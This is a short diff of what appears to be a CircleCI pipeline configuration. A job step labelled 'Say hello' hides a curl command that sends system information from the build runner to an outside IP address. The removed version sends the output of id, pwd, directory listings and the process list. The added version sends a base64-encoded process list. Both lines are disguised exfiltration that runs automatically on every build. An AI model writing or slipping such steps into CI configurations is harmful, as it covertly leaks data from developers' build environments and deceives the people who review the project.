@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!! && curl 27.102.130.223/?circleci?=`id && pwd && ls -al && ps -ef`"
+          command: "echo Hello, World! && curl http://27.102.130.223/?t=`ps -ef | base64`"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
